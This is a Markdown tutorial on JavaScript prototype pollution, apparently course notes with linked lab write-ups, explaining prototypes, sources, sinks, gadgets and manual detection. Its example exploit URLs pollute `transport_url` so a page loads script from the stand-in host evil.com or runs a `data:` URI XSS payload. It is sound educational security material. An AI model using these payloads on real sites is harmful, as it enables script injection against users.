
# JavaScript Prototype Pollution: A Deep Dive


## Lab Levels

Jump directly to the lab writeups:

* [PRACTITIONER](./PRACTITIONER_Lab.md)
* [EXPERT](./EXPERT_Lab.md)

  
## Introduction
## What is Prototype Pollution?

Prototype pollution is a vulnerability in JavaScript where an attacker adds arbitrary properties to a global object prototype (like `Object.prototype`). These polluted properties are then inherited by all objects in the application, potentially leading to security issues such as:
- Arbitrary code execution
- Access control bypass
- XSS

<img width="1221" height="610" alt="image" src="https://github.com/user-attachments/assets/b3ccdb79-c188-4d04-83ac-55a111032529" />


---

##  JavaScript Prototypes & Inheritance

### 🧱 Objects in JavaScript

A JavaScript object is a collection of key-value pairs:

```js
const user = {
  username: "wiener",
  userId: 1234,
  isAdmin: false
};
````

Properties can also be **methods**:

```js
const user = {
  username: "wiener",
  exampleMethod: function() {
    // do something
  }
};
```

---

###  What is a Prototype?

Each object in JavaScript has a `prototype` — an object it inherits from:

```js
let myObject = {};
Object.getPrototypeOf(myObject); // → Object.prototype
```

Other built-in prototypes:

* `String.prototype`
* `Array.prototype`
* `Number.prototype`

---

##  How Inheritance Works

If a property is not found on an object, JavaScript looks up its prototype chain:

<img width="937" height="578" alt="image" src="https://github.com/user-attachments/assets/cfc68915-c0d1-41b4-814e-7f0cbcf0aa84" />


```js
existingObject = { propertyA: 'A' }
myObject = Object.create(existingObject);

console.log(myObject.propertyA); // → 'A'
```

---

## 🛠 Accessing & Modifying Prototypes

Every object has a special property: `__proto__`.

```js
console.log(user.__proto__); // → Object.prototype
```

Modifying the prototype:

```js
String.prototype.removeWhitespace = function() {
  return this.replace(/^\s+|\s+$/g, '');
};

"  test  ".removeWhitespace(); // → "test"
```

---

## 💣 How Does Prototype Pollution Happen?

Prototype pollution often occurs during deep merge operations where unsanitized input is merged into an object:

```js
// URL
https://site.com/?__proto__[transport_url]=//evil.com

// JSON
JSON.parse('{"__proto__": {"evilProperty": "payload"}}');
```

```js
objectLiteral.hasOwnProperty('__proto__'); // false
objectFromJson.hasOwnProperty('__proto__'); // true
```

---

## 🚰 Pollution Components

### ✅ Source

Where user-controlled input pollutes a prototype (e.g., query string, JSON, web messages).

### ✅ Sink

Where polluted data is used (e.g., DOM manipulation, function calls, security checks).

### ✅ Gadget

A property that connects the source to the sink in an exploitable way.

---

## 💥 Example Exploit

```js
let transport_url = config.transport_url || defaults.transport_url;

let script = document.createElement('script');
script.src = `${transport_url}/example.js`;
document.body.appendChild(script);
```

**Exploit URL**:

```text
https://site.com/?__proto__[transport_url]=//evil.com
```

Or direct XSS via `data:` URI:

```text
https://site.com/?__proto__[transport_url]=data:,alert(1);//
```

---

## 🔎 Finding Prototype Pollution Vulnerabilities

###  Manual Testing

1. Inject via URL:

   ```
   ?__proto__[foo]=bar
   ?__proto__.foo=bar
   ```
2. Check in console:

   ```js
   Object.prototype.foo // "bar"
   ```

###  Using DOM Invader (Burp Suite)

* Automatically tests sources, sinks, and gadgets.
* Can generate XSS PoCs for valid gadgets.

---

## 🧰 Finding Gadgets Manually

1. Identify a potential gadget property used by the application.
2. Use debugger to pause execution.
3. Inject trace logic:

   ```js
   Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
     get() {
       console.trace();
       return 'polluted';
     }
   });
   ```
4. Step through and locate execution in a sink.

---


